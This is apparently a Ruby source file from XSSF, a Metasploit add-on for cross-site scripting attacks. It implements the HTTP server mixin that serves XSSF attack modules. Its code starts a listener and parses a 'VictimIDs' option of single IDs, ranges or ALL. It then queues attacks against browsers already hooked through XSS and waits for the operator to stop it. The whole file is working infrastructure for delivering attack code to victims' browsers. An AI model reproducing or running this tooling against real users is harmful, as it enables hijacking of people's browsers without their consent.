#
# This class implements Msf HTTPServer used to run XSSF modules
#
module Msf
module Xssf
	module XssfServer
		include Msf::Exploit::Remote::HttpServer::HTML
		include Msf::Xssf::XssfDatabase

		def initialize(info = {})
			super(update_info(info,
				'Name'        => 'XSSF MODULE',
				'Description' => 'XSSF MODULE',
				'Author'      => 'LuDo (CONIX Security)',
				'License'     => MSF_LICENSE
			))

			register_options(
				[
					OptString.new('VictimIDs'	, [false, 'IDs of the victims you want to receive the code.\nExamples : 1, 3-5 / ALL / NONE', 'ALL'])
				], Msf::Xssf::XssfServer
			)
			
			deregister_options('SSL', 'SSLVersion')		# Won't work with
		end


		#
		# Run an auxiliary module
		#
		def run		
			# Check if XSSF plugin is loaded
			active = false
			framework.plugins.each {|x| active = true if  (x.name == "XSSF")}

			if (!active)
				print_error("XSSF plugin must be started first ! [load XSSF]")
				return
			end

			begin
				print_status("Auxiliary module execution started, press [CTRL + C] to stop it !") 
				start_service;

				url = "http://#{(datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('1.2.3.4') : datastore['SRVHOST']}:#{datastore['SRVPORT']}#{get_resource}"
				datastore['VictimIDs'] = datastore['VictimIDs'].gsub(/\s*/, '')
			
				# If victim ID are provided
				if (datastore['VictimIDs'].upcase != "NONE")
					# Update all victims in the database
					if (datastore['VictimIDs'] =~ /^ALL$/)
						print_error("Error adding attack to some victims") if !attack_victim(nil, url, self.fullname)
					else
						(datastore['VictimIDs'].split(',')).each do |v|
							if (v =~ /^(\d+)-(\d+)$/) 
								($1..$2).each do |i|; (print_error("Error adding attack to victim #{i} - Check if victim exists") if !attack_victim(i, url, self.fullname)); end
							else
								(v =~ /^(\d+)$/) ? (print_error("Error adding attack to victim #{$1}  - Check if victim exists") if !attack_victim($1, url, self.fullname)) : print_error("Wrong victim ID or range '#{v}'")
							end
						end
					end
				end
				
				puts ""
				attacked_victims
				
				# Loop and wait for console interruption
				while (true) do; Rex::ThreadSafe.sleep(5); end;
			rescue ::Interrupt
				print_error("Auxiliary interrupted by the console user")
			rescue ::Exception
				print_error("#{$!}")
			end
		end
	end
end
end